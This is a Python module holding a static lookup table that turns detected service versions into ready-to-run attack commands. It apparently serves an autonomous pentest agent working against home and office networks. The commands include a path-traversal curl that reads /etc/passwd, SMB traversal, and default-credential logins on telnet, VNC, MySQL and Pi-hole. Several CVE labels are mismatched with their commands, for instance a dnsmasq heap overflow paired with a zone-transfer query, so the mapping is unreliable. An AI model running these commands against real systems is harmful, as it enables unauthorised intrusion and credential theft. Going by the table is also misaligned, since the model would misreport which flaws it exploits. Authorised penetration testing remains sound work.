"""Local CVE→command database for common pentest targets.

Maps service + version patterns to CVE IDs and ready-to-run exploit commands.
Used by the hint system to suggest specific, actionable exploit commands
instead of generic "try nxc ssh" suggestions.

This is intentionally a static lookup table — no external API calls.
Curated for home/office network targets commonly found by the agent.
"""

import re


# Each entry: service pattern, version regex, CVE, description, command template
# {ip} is replaced with the target IP at hint time
CVE_DB = [
    # ── OpenSSH ──
    {
        "service": "openssh",
        "version_re": r"(8\.[5-9]|9\.[0-7])",
        "cve": "CVE-2024-6387",
        "desc": "regreSSHion race condition RCE (glibc Linux)",
        "commands": [
            "nmap -T2 --script=vulners -p 22 {ip}",
        ],
    },
    {
        "service": "openssh",
        "version_re": r"[2-7]\.|8\.[0-2]",
        "cve": "CVE-2018-15473",
        "desc": "OpenSSH user enumeration",
        "commands": [
            "nmap -T2 --script=ssh-auth-methods -p 22 {ip}",
        ],
    },

    # ── Samba / SMB ──
    {
        "service": "samba",
        "version_re": r"[34]\.",
        "cve": "CVE-2017-7494",
        "desc": "SambaCry RCE (writable share needed)",
        "commands": [
            "nmap -T2 --script=smb-vuln-cve-2017-7494 -p 445 {ip}",
            "impacket-samrdump {ip}",
        ],
    },
    {
        "service": "samba",
        "version_re": r"4\.(1[0-7]|[0-9])\.",
        "cve": "CVE-2023-3961",
        "desc": "Samba path traversal (pipe name)",
        "commands": [
            "smbclient -N //{ip}/share -c 'ls ../'",
            "impacket-rpcdump {ip}",
        ],
    },

    # ── DNS / dnsmasq ──
    {
        "service": "dnsmasq",
        "version_re": r"2\.([0-7][0-9]|8[0-5])",
        "cve": "CVE-2020-25681",
        "desc": "dnsmasq heap overflow via DNSSEC",
        "commands": [
            "dig axfr @{ip}",
        ],
    },

    # ── HTTP / Web ──
    {
        "service": "apache",
        "version_re": r"2\.4\.(49|50)",
        "cve": "CVE-2021-41773",
        "desc": "Apache path traversal RCE",
        "commands": [
            "curl -s http://{ip}/.%2e/%2e%2e/%2e%2e/etc/passwd",
        ],
    },
    {
        "service": "lighttpd",
        "version_re": r"1\.4\.",
        "cve": "misc",
        "desc": "lighttpd common misconfigs",
        "commands": [
            "curl -s http://{ip}/server-info",
            "curl -s http://{ip}/server-status",
        ],
    },
    {
        "service": "pi-hole",
        "version_re": r".*",
        "cve": "CVE-2020-8816",
        "desc": "Pi-hole RCE via MAC validation bypass",
        "commands": [
            "curl -s -X POST http://{ip}/admin/index.php -d 'pw=admin'",
            "curl -s http://{ip}/admin/api.php?status",
        ],
    },

    # ── VNC ──
    {
        "service": "vnc",
        "version_re": r".*",
        "cve": "misc",
        "desc": "VNC common defaults",
        "commands": [
            "nxc vnc {ip} -p password",
            "nxc vnc {ip} -p raspberry",
            "nmap -T2 --script=vnc-info -p 5900 {ip}",
        ],
    },

    # ── Telnet ──
    {
        "service": "telnet",
        "version_re": r".*",
        "cve": "misc",
        "desc": "Telnet default creds (almost always vulnerable)",
        "commands": [
            "nxc telnet {ip} -u admin -p admin",
            "nxc telnet {ip} -u root -p root",
        ],
    },

    # ── FTP ──
    {
        "service": "ftp",
        "version_re": r".*",
        "cve": "misc",
        "desc": "FTP anonymous access",
        "commands": [
            "nxc ftp {ip} -u anonymous -p anonymous",
            "nmap -T2 --script=ftp-anon -p 21 {ip}",
        ],
    },

    # ── Redis ──
    {
        "service": "redis",
        "version_re": r".*",
        "cve": "misc",
        "desc": "Redis unauthenticated access",
        "commands": [
            "redis-cli -h {ip} INFO",
        ],
    },

    # ── MySQL ──
    {
        "service": "mysql",
        "version_re": r".*",
        "cve": "misc",
        "desc": "MySQL default creds",
        "commands": [
            "nxc mysql {ip} -u root -p root",
        ],
    },
]


def lookup(service: str, version: str = "") -> list:
    """Return matching CVE entries for a service+version."""
    results = []
    svc = service.lower()
    for entry in CVE_DB:
        if entry["service"] in svc:
            if not version or re.search(entry["version_re"], version):
                results.append(entry)
    return results


def get_exploit_hint(observations: list, ip: str) -> str:
    """Parse host observations for version strings, return a CVE exploit hint.

    Returns a ready-to-run command string, or None if no match.
    """
    import random
    for obs_text in observations:
        # Match: "SSH: OpenSSH 9.2p1", "Samba version: 4.17.12", etc.
        m = re.search(
            r'(OpenSSH|Samba|dnsmasq|Apache|nginx|lighttpd|Pi-hole)\s*:?\s*v?(\S+)',
            obs_text, re.IGNORECASE)
        if m:
            service, version = m.group(1), m.group(2)
            matches = lookup(service, version)
            if matches:
                entry = random.choice(matches)
                cmd = random.choice(entry["commands"]).format(ip=ip)
                return f"Try: {cmd} ({entry['cve']}: {entry['desc'][:40]}). "

        # Also match port-based tags
        if "Pi-hole" in obs_text or "pi-hole" in obs_text:
            matches = lookup("pi-hole")
            if matches:
                entry = matches[0]
                cmd = random.choice(entry["commands"]).format(ip=ip)
                return f"Try: {cmd} (Pi-hole exploit). "

    return None
